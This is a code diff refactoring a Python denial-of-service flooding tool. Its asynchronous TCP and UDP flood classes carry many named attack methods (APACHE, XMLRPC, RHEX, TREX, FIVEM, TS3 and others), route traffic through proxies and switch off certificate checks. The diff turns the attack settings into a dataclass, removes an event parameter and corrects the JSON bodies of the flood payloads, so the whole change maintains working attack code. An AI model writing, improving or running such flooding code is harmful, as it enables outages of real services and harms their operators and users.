@@ -5,13 +5,12 @@ import random
 import struct
 import time
 from copy import copy
+from dataclasses import dataclass
 from functools import partial
 from os import urandom as randbytes
-from socket import (SO_LINGER, SOL_SOCKET, SO_RCVBUF, inet_ntoa)
-from ssl import CERT_NONE, SSLContext, create_default_context
+from socket import (inet_ntoa, SO_LINGER, SO_RCVBUF, SOL_SOCKET)
+from ssl import CERT_NONE, create_default_context, SSLContext
 from string import ascii_letters
-import struct
-from threading import Event
 from typing import Callable, Optional, Set, Tuple
 from urllib import parse
 
@@ -21,7 +20,7 @@ from OpenSSL import SSL
 from yarl import URL
 
 from . import proxy_proto
-from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO 
+from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
 from .proxies import NoProxySet, ProxySet
 from .targets import TargetStats
 from .vendor.referers import REFERERS
@@ -44,7 +43,6 @@ except AttributeError:
     pass
 ctx.verify_mode = CERT_NONE
 ctx.set_ciphers("DEFAULT")
-
 
 trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
 # Making sure we are using TLS1.2 with RSA cipher suite (key exchange, authentication)
@@ -72,9 +70,9 @@ class Methods:
         "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
         # this is not HTTP method (rather TCP) but this way it works with --http-methods
         # settings being applied to the entire set of targets
-        "TREX" 
+        "TREX"
     }
-    TCP_METHODS: Set[str] = {"TCP",}
+    TCP_METHODS: Set[str] = {"TCP", }
     UDP_METHODS: Set[str] = {
         "UDP", "VSE", "FIVEM", "TS3", "MCPE",
         # the following methods are temporarily disabled for further investigation and testing
@@ -130,6 +128,7 @@ def request_info_size(request: aiohttp.RequestInfo) -> int:
     return len(f"{status_line}\r\n{headers}\r\n\r\n".encode())
 
 
+@dataclass
 class AttackSettings:
     connect_timeout_seconds: float
     dest_connect_timeout_seconds: float
@@ -139,32 +138,8 @@ class AttackSettings:
     tcp_read_timeout_seconds: float
     requests_per_connection: int
     high_watermark: int
+    reader_limit: int
     socket_rcvbuf: int
-
-    def __init__(
-        self,
-        *,
-        connect_timeout_seconds: float = 8,
-        dest_connect_timeout_seconds: float = 8,
-        drain_timeout_seconds: float = 5.0,
-        close_timeout_seconds: float = 1.0,
-        http_response_timeout_seconds: float = 15.0,
-        tcp_read_timeout_seconds: float = 0.2,
-        requests_per_connection: int = 1024,
-        high_watermark: int = 1024 << 5,
-        reader_limit: int = 1024 << 6,
-        socket_rcvbuf: int = 1024 << 5,
-    ):
-        self.connect_timeout_seconds = connect_timeout_seconds
-        self.dest_connect_timeout_seconds = dest_connect_timeout_seconds
-        self.drain_timeout_seconds = drain_timeout_seconds
-        self.close_timeout_seconds = close_timeout_seconds
-        self.http_response_timeout_seconds = http_response_timeout_seconds
-        self.tcp_read_timeout_seconds = tcp_read_timeout_seconds
-        self.requests_per_connection = requests_per_connection
-        self.high_watermark = high_watermark
-        self.reader_limit = reader_limit
-        self.socket_rcvbuf = socket_rcvbuf
 
     def with_options(self, **kwargs) -> "AttackSettings":
         settings = copy(self)
@@ -196,13 +171,11 @@ class AsyncTcpFlood:
         target: URL,
         addr: str,
         method: str,
-        event: Event,
         proxies: ProxySet,
         stats: TargetStats,
         loop,
-        settings: Optional[AttackSettings] = None
+        settings: AttackSettings
     ) -> None:
-        self._event = event
         self._target = target
         self._addr = addr
         self._raw_target = (self._addr, (self._target.port or 80))
@@ -219,7 +192,7 @@ class AsyncTcpFlood:
 
         self._loop = loop
         self._transport = None
-        self._settings = settings or AttackSettings()
+        self._settings = settings
 
     @property
     def stats(self) -> TargetStats:
@@ -362,7 +335,7 @@ class AsyncTcpFlood:
                 "X-Requested-With: XMLHttpRequest\r\n"
                 "Content-Type: application/json\r\n"
             ),
-            body='{"data": %s' % Tools.rand_str(32)
+            body='{"data": "%s"}' % Tools.rand_str(32)
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
@@ -374,7 +347,7 @@ class AsyncTcpFlood:
                 "X-Requested-With: XMLHttpRequest\r\n"
                 "Content-Type: application/json\r\n"
             ),
-            body='{"data": %s}' % Tools.rand_str(512)
+            body='{"data": "%s"}' % Tools.rand_str(512)
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
@@ -630,7 +603,7 @@ class AsyncTcpFlood:
                 None,
                 downstream_factory=trex_proto,
                 connect_timeout=self._settings.dest_connect_timeout_seconds,
-                on_connect=self._loop.create_future() # as we don't want it to fire too early
+                on_connect=self._loop.create_future()  # as we don't want it to fire too early
             )
             conn = self._loop.create_connection(
                 trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=None)
@@ -668,18 +641,16 @@ class AsyncUdpFlood:
         self,
         target: Tuple[str, int],
         method: str,
-        event: Event,
         proxies: ProxySet,
         stats: TargetStats,
         loop,
-        settings: Optional[AttackSettings] = None,
+        settings: AttackSettings,
     ):
         self._target = target
-        self._event = event
         self._stats = stats
         self._proxies = proxies
         self._loop = loop
-        self._settings = settings or AttackSettings()
+        self._settings = settings
 
         self._method = method
         self.SENT_FLOOD = getattr(self, method)
@@ -743,7 +714,7 @@ class AsyncUdpFlood:
         return await self._generic_flood(lambda: (packet, packet_size))
 
 
-def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
+def main(url, ip, method, proxies, stats, loop=None, settings=None):
     if method not in Methods.ALL_METHODS:
         raise RuntimeError(f"Method {method} Not Found")
 
@@ -753,7 +724,6 @@ def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
             url,
             ip,
             method,
-            event,
             proxies,
             stats,
             loop=loop,
@@ -764,7 +734,6 @@ def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
         return AsyncUdpFlood(
             (ip, url.port),
             method,
-            event,
             proxies,
             stats,
             loop=loop,
